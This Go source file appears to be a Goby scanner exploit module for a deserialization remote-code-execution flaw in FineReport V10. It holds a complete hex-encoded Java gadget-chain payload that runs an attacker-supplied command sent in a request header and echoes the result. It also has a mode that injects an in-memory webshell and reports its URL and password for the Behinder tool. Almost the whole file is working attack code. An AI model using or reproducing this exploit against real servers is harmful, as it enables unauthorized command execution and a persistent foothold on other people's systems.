package exploits

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FineReport V10 Deserialization RCE Vulnerability",
    "Description": "<p>Founded in 2006, fansoft software is a professional big data Bi and analysis platform provider in China. It focuses on the field of business intelligence and data analysis, and is committed to providing one-stop business intelligence solutions for global enterprises.</p><p>There is a deserialization vulnerability in the sail soft data decision system finereport V10 /webroot/decision/remote/design/channel. An attacker can execute arbitrary code on the target server and obtain server privileges by sending carefully constructed deserialized data.</p>",
    "Impact": "<p>FineReport V10 Deserialization RCE Vulnerability</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.finereport.com\">https://www.finereport.com</a></p>",
    "Product": "Fanruan-FineReport",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "帆软数据决策系统 FineReport V10 反序列化漏洞",
            "Product": "帆软-FineReport",
            "Description": "<p>帆软软件成立于2006年，是中国专业的大数据BI和分析平台提供商，专注商业智能和数据分析领域，致力于为全球企业提供一站式商业智能解决方案。</p><p>帆软数据决策系统 FineReport v10&nbsp;存在反序列化漏洞，攻击者可以通过发送精心构造的反序列化数据，在目标服务器上执行任意代码，获取服务器权限。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.finereport.com\">https://www.finereport.com</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">帆软数据决策系统 FineReport v10&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">存在反序列化漏洞，攻击者可以通过发送精心构造的反序列化数据，在目标服务器上执行任意代码，获取服务器权限。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "信创"
            ]
        },
        "EN": {
            "Name": "FineReport V10 Deserialization RCE Vulnerability",
            "Product": "Fanruan-FineReport",
            "Description": "<p>Founded in 2006, fansoft software is a professional big data Bi and analysis platform provider in China. It focuses on the field of business intelligence and data analysis, and is committed to providing one-stop business intelligence solutions for global enterprises.</p><p>There is a deserialization vulnerability in the sail soft data decision system finereport V10 /webroot/decision/remote/design/channel. An attacker can execute arbitrary code on the target server and obtain server privileges by sending carefully constructed deserialized data.<br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://www.finereport.com\">https://www.finereport.com</a><br></p>",
            "Impact": "<p>FineReport V10 Deserialization RCE Vulnerability</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "body=\"/webroot/decision/\"",
    "GobyQuery": "body=\"/webroot/decision/\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.finereport.com",
    "DisclosureDate": "2022-08-01",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "ysoserial,cmd",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        },
        {
            "name": "url",
            "type": "input",
            "value": "/test",
            "show": "0=1"
        },
        {
            "name": "password",
            "type": "input",
            "value": "test",
            "show": "0=1"
        },
        {
            "name": "referer",
            "type": "input",
            "value": "https://www.baidu.com/",
            "show": "0=1"
        },
        {
            "name": "serizalizedData",
            "type": "input",
            "value": "",
            "show": "0=1"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7314"
}`

	gzip12314814141 := func(input []byte) ([]byte, error) {
		var buf bytes.Buffer
		gzipWriter := gzip.NewWriter(&buf)
		_, err := gzipWriter.Write(input)
		if err != nil {
			_ = gzipWriter.Close()
			return nil, err
		}
		if err := gzipWriter.Close(); err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	}

	exploitFineReportV10czsdf1234 := func(u *httpclient.FixUrl, data string, cmd string) string {
		cfg := httpclient.NewPostRequestConfig("/webroot/decision/remote/design/channel")
		cfg.FollowRedirect = true
		cfg.Timeout = 15
		if cmd != "" {
			cfg.Header.Store("X-Token-Data", cmd)
		}

		payloadStr, err := hex.DecodeString(data)
		if err != nil {
			return ""
		}
		poc, err2 := gzip12314814141(payloadStr)
		if err2 != nil {
			return ""
		}
		cfg.Data = string(poc)
		if resp, err1 := httpclient.DoHttpRequest(u, cfg); err1 == nil && resp.StatusCode == 200 {
			return resp.RawBody
		}
		return ""
	}

	payloadCB17xTomcatEcho := "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72cf8e0182fe4ef17e0200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b78700000000000000000757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e002000078700000121bcafebabe0000003101010a001f006e0a0022006f0a007000710a007200730a007200740a001f00750800760a001d00770a007800790a0078007a07007b0a0072007c08007d0a0022007e08007f0800800700810800820800830700840a001d00850800860800870700880b001800890b0018008a08008b08008c07008d0a001d008e07008f0a009000910800920700930800940a0022009508009609002700970700980a0027009908009a0a0070009b0a0022009c08009d08009e08009f0800a00800a10700a20800a30800a40a001d00a50700a60800a70a003100a80700a90800aa0800ab0800ac0a002700ad0800ae0700af0900b000970a001d00b10a009000790a002700b20a005500b30a00b000b40800b50800b60700b70700b80a0048006e0a004700b90a004800ba0800bb0a001d00bc0800bd0a004800be0800bf0700c00800c10800c20700c30700c40100063c696e69743e010003282956010004436f6465010009746f43537472696e67010016284c6a6176612f6c616e672f537472696e673b295b4201000d537461636b4d61705461626c650100083c636c696e69743e0700c50700c60700c707009307008f0700840700880700c80700a207008d0700a60700c90700ca0700b70700b80700c00700c30c005600570c00cb00cc0700cd0c00ce00cf0700c70c00d000d10c00d200d30c00d400d5010007746872656164730c00d600d70700c60c00d800d90c00da00db0100135b4c6a6176612f6c616e672f5468726561643b0c00dc00dd010004657865630c00de00df010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001000768616e646c657201001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c00e000d5010006676c6f62616c01000a70726f636573736f727301000e6a6176612f7574696c2f4c6973740c00e100e20c00da00e301000372657101000b676574526573706f6e736501000f6a6176612f6c616e672f436c6173730c00e400e50100106a6176612f6c616e672f4f626a6563740700ca0c00e600e70100096765744865616465720100106a6176612f6c616e672f537472696e6701000c582d546f6b656e2d446174610c00e800e90100097365745374617475730c00ea00eb0100116a6176612f6c616e672f496e74656765720c005600ec0100076f732e6e616d650c00ed00ee0c00ef00dd01000377696e010003636d640100022f630100092f62696e2f626173680100022d6301000f73756e2f6d6973632f556e73616665010009746865556e736166650100156a6176612e6c616e672e554e495850726f636573730c00f000f10100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100156a6176612e6c616e672e50726f63657373496d706c0c00f200f30100025b4201000f6c61756e63684d656368616e69736d01000a68656c706572706174680100076f7264696e616c0c00f400e201000b666f726b416e64457865630100025b490700f50c00f600e50c00f700f80c0059005a0c00f700f901000b696e697453747265616d7301000e676574496e70757453747265616d0100136a6176612f696f2f496e70757453747265616d01001d6a6176612f696f2f4279746541727261794f757470757453747265616d0c00fa00fb0c00fc00fd0100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b0c00fe00ff01000873657442797465730c010000cc010007646f577269746501001f6a6176612f6c616e672f4e6f537563684d6574686f64457863657074696f6e0100136a6176612e6e696f2e42797465427566666572010004777261700100136a6176612f6c616e672f457863657074696f6e0100306f72672f737531382f79737573657269616c2f7061796c6f6164732f74656d706c617465732f546f6d6361744563686f0100156a6176612f6c616e672f54687265616447726f75700100176a6176612f6c616e672f7265666c6563742f4669656c640100106a6176612f6c616e672f5468726561640100135b4c6a6176612f6c616e672f537472696e673b0100035b5b420100186a6176612f6c616e672f7265666c6563742f4d6574686f64010008676574427974657301000428295b420100106a6176612f6c616e672f53797374656d0100096172726179636f707901002a284c6a6176612f6c616e672f4f626a6563743b494c6a6176612f6c616e672f4f626a6563743b4949295601000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000d6765745375706572636c61737301000473697a650100032829490100152849294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076973456d70747901000328295a010004545950450100114c6a6176612f6c616e672f436c6173733b0100042849295601000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f77657243617365010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b010010616c6c6f63617465496e7374616e6365010025284c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f4f626a6563743b010008696e7456616c75650100116a6176612f6c616e672f426f6f6c65616e0100116765744465636c617265644d6574686f6401000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010016285a294c6a6176612f6c616e672f426f6f6c65616e3b01000472656164010005285b4229490100057772697465010007285b424949295601000b6e6577496e7374616e636501001428294c6a6176612f6c616e672f4f626a6563743b01000b746f42797465417272617900210055001f000000000003000100560057000100580000001100010001000000052ab70001b10000000000090059005a000100580000003900050003000000242ac7000501b02ab600024c2bbe0460bc084d2b032c032bbeb800032c2cbe046403542cb000000001005b000000030001060008005c0057000100580000075b000800260000051f033bb80004b600054c2bb600061207b600084d2c04b600092c2bb6000ac0000bc0000b4e03360415042dbea204ef2d1504323a051905c70006a704db1905b6000c3a061906120db6000e9a000d1906120fb6000e9a0006a704bd1905b600061210b600084d2c04b600092c1905b6000a3a071907c100119a0006a7049a1907b600061212b600084d2c04b600092c1907b6000a3a071907b600061213b600084da700163a081907b60006b60015b600151213b600084d2c04b600092c1907b6000a3a071907b60006b600151216b600084da700103a081907b600061216b600084d2c04b600092c1907b6000a3a071907b600061217b600084d2c04b600092c1907b6000ac00018c000183a0803360915091908b900190100a203f019081509b9001a02003a0a190ab60006121bb600084d2c04b600092c190ab6000a3a0b190bb60006121c03bd001db6001e190b03bd001fb600203a0c190bb60006122104bd001d5903122253b6001e190b04bd001f5903122353b60020c000223a061906c6037c1906b600249a0374190cb60006122504bd001d5903b2002653b6001e190c04bd001f5903bb0027591100c8b7002853b6002057013a0d1229b8002ab6002b122cb6000e99001b06bd00225903122d535904122e5359051906533a0da7001806bd00225903122f53590412305359051906533a0d12311232b600083a0e190e04b60009190e01b6000ac000313a0f013a101233b800343a10a7000c3a111236b800343a10190f1910b600373a11190dbe0464bd00383a121912be361303361415141912bea2002319121514190d1514046032b600025315131912151432be603613841401a7ffdb1513bc083a1403361519123a161916be361703361815181517a2002719161518323a19191903191415151919beb8000315151919be0460603615841801a7ffd804bc0a3a1606bc0a5903024f5904024f5905024f3a1719101239b600083a181910123ab600083a19191804b60009191904b6000919181911b6000a3a1a19191911b6000ac00038c000383a1b191ab60006123b03bd001db6001e191a03bd001fb60020c00027b6003c361c1910123d100abd001d5903b20026535904123853590512385359061238535907b20026535908123853591006b2002653591007123853591008123e53591009b2003f53b600403a1d191d04b60041191d1911100abd001f5903151c0460b80042535904191b535905190d0332b8004353590619145359071912beb8004253590801535910061916032eb8004253591007015359100819175359100903b8004453b60020571910124504bd001d5903123e53b600403a1e191e04b60041191e191104bd001f5903191753b60020571910124603bd001db6001e3a1f191f04b60041191f191103bd001fb60020c000473a20bb004859b700493a21033622110400bc083a2319201923b6004a593622029f001019211923031522b6004ba7ffe8124cb800343a241924b6004d3a071924124e06bd001d59031238535904b20026535905b2002653b60040190706bd001f59031921b6004f535904bb00275903b700285359051921b6004fbeb8004253b6002057190cb60006125004bd001d5903192453b6001e190c04bd001f5903190753b6002057a700513a241252b800343a251925125304bd001d5903123853b60040192504bd001f59031921b6004f53b600203a07190cb60006125004bd001d5903192553b6001e190c04bd001f5903190753b6002057043b043b1a990006a70009840901a7fc0a1a990006a7000ea700053a05840401a7fb10a700044bb10009009500a000a3001400c300d100d4001402120219021c0035043104a604a90051002e003905120054003c005705120054005a007a05120054007d050c051200540000051a051d00540001005b000001e2001fff002700050107005d07005e07000b010000fc001407005ffc001a07006002fc002207006165070062125d0700620cfd002d07006301ff00d0000e0107005d07005e07000b0107005f07006007006107006301070061070061070061070064000014ff002600110107005d07005e07000b0107005f0700600700610700630107006107006107006107006407005e070065070066000107006708ff001a00150107005d07005e07000b0107005f0700600700610700630107006107006107006107006407005e07006507006607006107006801010000fa0027ff001400190107005d07005e07000b0107005f0700600700610700630107006107006107006107006407005e070065070066070061070068010700380107006801010000f8002aff016d00240107005d07005e07000b0107005f0700600700610700630107006107006107006107006407005e070065070066070061070068010700380107003e07003e07005e07005e0700610700380107006907006907006907006a07006b0107003800001af7007707006cfb004dff0003000d0107005d07005e07000b0107005f070060070061070063010700610700610700610000f80006fa0005ff000600050107005d07005e07000b0100004207006d01ff0005000000004207006d0000007571007e001000000114cafebabe0000003300110100336f72672f6170616368652f78616c616e2f776562736f636b65742f7365727665722f577353657373696f6e4c697374656e65720700010100106a6176612f6c616e672f4f626a65637407000301000a536f7572636546696c65010016577353657373696f6e4c697374656e65722e6a61766101001073657269616c56657273696f6e5549440100014a0571e669ee3c6d471801000d436f6e7374616e7456616c75650100063c696e69743e0100032829560c000c000d0a0004000e010004436f646500210002000400000001001a000700080001000b00000002000900010001000c000d000100100000001100010001000000052ab7000fb10000000000010005000000020006707400085a59424d4e524654707701007871007e000d78"

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(6)
			resp := exploitFineReportV10czsdf1234(u, payloadCB17xTomcatEcho, "echo "+randStr)
			return strings.Contains(resp, randStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			if ss.Params["AttackType"].(string) == "cmd" {
				cmd := ss.Params["command"].(string)
				resp := exploitFineReportV10czsdf1234(expResult.HostInfo, payloadCB17xTomcatEcho, cmd)
				if resp != "" {
					split, _ := hex.DecodeString("0a1f8b080000")
					expResult.Output = strings.Split(resp, string(split))[0]
					expResult.Success = true
				}
			} else if ss.Params["AttackType"].(string) == "ysoserial" {
				url := ss.Params["url"].(string)
				password := ss.Params["password"].(string)
				referer := ss.Params["referer"].(string)
				serizalizedData := ss.Params["serizalizedData"].(string)

				if serizalizedData == "" {
					expResult.Output = "请使用 ysoserial 插件填充数据"
					return expResult
				}

				data, _ := base64.StdEncoding.DecodeString(serizalizedData)
				expResult.Output = hex.EncodeToString(data)
				resp := exploitFineReportV10czsdf1234(expResult.HostInfo, hex.EncodeToString(data), "")
				if resp != "" {
					// 检查内存马是否注入成功
					cfg := httpclient.NewGetRequestConfig("/webroot" + url + "?" + password + "=1")
					cfg.Header.Store("Referer", referer)

					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp2.StatusCode != 404 {
						expResult.Success = true
						expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/webroot" + url + "\r\n"
						expResult.Output += "Password: " + password + "\r\n"
						expResult.Output += "Webshell tool: Behinder v3.0\r\n"
						expResult.Output += "Webshell type: jsp\r\n"
						expResult.Output += "Referer: " + referer
					}
					return expResult
				}
			}

			return expResult
		},
	))
}
